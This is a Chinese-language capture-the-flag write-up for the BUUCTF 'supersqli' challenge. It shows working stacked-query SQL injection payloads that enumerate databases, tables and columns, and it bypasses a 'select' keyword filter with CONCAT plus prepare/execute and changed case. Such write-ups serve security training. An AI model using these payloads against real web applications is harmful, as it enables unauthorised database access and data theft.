# BUUCTF 随便注
- 关键词 sql注入 select绕过

## 题目描述
![183233cedc438e34fad8fd679592bead.png](../_resources/183233cedc438e34fad8fd679592bead.png)
## 解题思路
### 题目提示了是supersqli,所以尝试下sql注入
### 尝试下 1',发现报错，肯定存在sql注入点
![image](https://user-images.githubusercontent.com/24989246/175016538-d6a222a5-ec09-4266-8479-32cf1a747913.png)

### 列出数据库和表名
1';show databases;#    1';show tables#
![image](https://user-images.githubusercontent.com/24989246/175016921-a0229ba2-011d-4f7d-ae45-2100cc42a2eb.png)

### 发现数字的表名比较奇怪，列出字段试试
 1';show columns from `1919810931114514`;# 
 ![image](https://user-images.githubusercontent.com/24989246/175017051-f7033f4e-bbcd-4807-a91a-c553254da2d2.png)
 
### 发现flag字样，直接查询试试
![image](https://user-images.githubusercontent.com/24989246/175017186-4badfa4e-3485-43d5-9bde-48944ccc4fb8.png)

### 发现select被过滤了，尝试下预编译
```sql
1';
set @sql = CONCAT('sele','ct flag from `1919810931114514`;');
prepare stmt from @sql;
EXECUTE stmt;#
```
![image](https://user-images.githubusercontent.com/24989246/175017366-0ea839ad-b036-4fdd-b3d3-83acc2750a54.png)

### 发现set函数和prepare函数被过滤了，但是，strstr函数不区分大小写，所以，修改大小写尝试下
```sql
1';
Set @sql = CONCAT('sele','ct flag from `1919810931114514`;');
Prepare stmt from @sql;
EXECUTE stmt;#
```
![image](https://user-images.githubusercontent.com/24989246/175017792-4762b108-ac39-4301-9c7d-44cd64518a1f.png)

### 成功拿到flag
